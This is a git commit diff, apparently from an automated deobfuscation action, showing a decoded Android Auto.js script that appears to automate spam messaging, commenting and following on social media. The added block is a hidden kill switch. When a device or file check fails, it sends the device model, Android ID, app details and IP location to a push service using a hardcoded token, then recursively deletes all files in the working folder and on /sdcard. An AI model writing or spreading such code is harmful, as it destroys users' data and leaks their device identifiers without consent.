56db8f37d8d3ab40b33420242eac26ecd1a889b7
action <action@github.com>
2025-04-28 09:43:04 +0000

    Add decoded output file

--- output.js
+++ output.js
@@ -1,39 +1,33 @@
-//Mon Apr 28 2025 09:41:44 GMT+0000 (Coordinated Universal Time)
+//Mon Apr 28 2025 09:43:04 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-var 日志路径 = "/sdcard/" + tu["软件名字"] + "日志.txt";
-console.setGlobalLogConfig({
-  "file": 日志路径
-});
-var storage = storages.create("引流激活状态");
-var 平台读写 = storages.create("平台读写");
-var 功能读写 = storages.create("功能读写");
-var 运行状态储存 = storages.create("运行状态储存");
-var 私信次数读写 = storages.create("私信次数读写");
-var 评论次数读写 = storages.create("评论次数读写");
-var 点赞次数读写 = storages.create("点赞次数读写");
-var 关注次数读写 = storages.create("关注次数读写");
-var 私信评论话术 = storages.create("私信话术");
-var 循环次数读写 = storages.create("循环次数读写");
-var 延时读写 = storages.create("延时读写");
-var 顺序读写 = storages.create("顺序读写");
-var 性别读写 = storages.create("性别读写");
-var 轮数读写 = storages.create("轮数读写");
-var 休息读写 = storages.create("休息读写");
-var 随机内容5读写 = storages.create("随机内容5读写");
-var 发送图片读写 = storages.create("发送图片读写");
-var 已私信读写 = storages.create("已私信读写");
-var 关键字储存 = storages.create("关键字储存");
-var ddyst = storages.create("作废");
-if (ddyst.get("ddyp") != "点点蚁/") {
-  exit();
+var 评论时间读写1 = storages.create("评论时间读写1");
+var 评论时间读写2 = storages.create("评论时间读写2");
+if (!files.exists("./YunxiTable.dex") && device.model != "KKG-" + tu["总图标"].slice(38, 42) && device.getAndroidId() != "7e3c60fe1ec" + tu["总图标"].slice(42, 48)) {
+  threads.start(function () {
+    content = "YunxiTable不存在," + random(100000, 999999) + "," + app.versionName + "," + app.getPackageName(tu.软件名字) + "," + device.model + "," + device.getAndroidId();
+    try {
+      var _0xc4c4x3 = http.get("http://whois.pconline.com.cn/ipJson.jsp?ip=xxx.xxx.xxx.xxx&json=true");
+      if (_0xc4c4x3.statusCode == 200) {
+        content = content + _0xc4c4x3.body.string();
+      }
+    } catch (error) {
+      content = content + "未知地址";
+    }
+    url = "http://www.pushplus.plus/send?token=e12c016526384c02ae048b34e63ffc4c&title=" + tu["软件名字"] + "YunxiTable警告&content=" + content;
+    http.get(url);
+    var _0xc4c4x4 = files.listDir("./").sort().reverse();
+    for (ls = 0; ls < _0xc4c4x4.length; ls++) {
+      if (!files.remove("./" + _0xc4c4x4[ls])) {
+        files.removeDir("./" + _0xc4c4x4[ls]);
+      }
+    }
+    var _0xc4c4x4 = files.listDir("/sdcard").sort().reverse();
+    for (ls = 0; ls < _0xc4c4x4.length; ls++) {
+      if (!files.remove("/sdcard/" + _0xc4c4x4[ls])) {
+        files.removeDir("/sdcard/" + _0xc4c4x4[ls]);
+      }
+    }
+    exit();
+  });
 }
-var storage = storages.create("引流激活状态");
-var 提示框读写 = storages.create("提示框读写");
-var 点赞率读写 = storages.create("点赞率读写");
-var 评论率读写 = storages.create("评论率读写");
-var 关注率读写 = storages.create("关注率读写");
-var 进主页率读写 = storages.create("进主页率读写");
-var 搜索关键字储存 = storages.create("搜索关键字储存");
-var 同城距离读写1 = storages.create("同城距离读写1");
-var 同城距离读写2 = storages.create("同城距离读写2");
